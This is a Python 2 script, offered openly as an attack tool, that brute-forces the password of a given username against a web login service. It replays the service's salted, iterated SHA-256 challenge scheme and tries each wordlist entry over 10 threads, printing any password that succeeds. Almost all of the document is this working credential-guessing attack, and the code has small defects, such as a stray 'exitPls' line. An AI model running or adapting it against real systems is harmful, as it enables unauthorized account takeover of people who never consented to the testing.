# Description
# Bruteforces the password of an given username, with a wordlist

# Parameters
# Parameter 1: Username
# Parameter 2: Wordlist

# Additional
# Replace [Host] with the host

import sys
import requests
import hashlib
import signal
import json
from collections import namedtuple
from os import system
import re
from multiprocessing.dummy import Pool

def signal_handler(signal, frame):
        print('Quiting')
        sys.exit(0)

def login(loginID, password, getCookie = False):
    #get challenge
    try:
        r = requests.get('https://[Host]/Services/Security.asmx/InitializeLogin?loginid=%s' % loginID)
    except:
        return login(loginID, password, getCookie)
    s = r.content
    s = s[s.index('{'):s.index('}') + 1]
    x = json.loads(s, object_hook=lambda d: namedtuple('X', d.keys())(*d.values()))

    #hash password with challenge
    hash_dig = password
    try:
        for i in range(0, x.iterations):
            hash_dig = hashlib.sha256(hash_dig + x.salt + password).hexdigest()
        hash_dig = hashlib.sha256(hash_dig + x.challenge).hexdigest()
    except:
        print "[!] Error on loginID",loginID
        return False

    try:
        login = requests.get('https://[Host]/Services/Security.asmx/Login?response=%s' % hash_dig, cookies=r.cookies)
    except:
        return login(loginID, password, getCookie)

    if getCookie:
        return r.cookies
    return "true" in login.content

def loginThread(password):
    username = sys.argv[1]
    if login(username, password):
        print '[+] {0} with password {1} \n'.format(username, password),
        exitPls
        exit(1)

print "[*] Trying the passwords from {0} on the user {1}".format(str(sys.argv[2]), str(sys.argv[1]))

passwords = [line.rstrip('\n') for line in open(str(sys.argv[2]))]
signal.signal(signal.SIGINT, signal_handler)

pool = Pool(10)
asyncres = pool.map(loginThread, passwords)
pool.close()
pool.join()
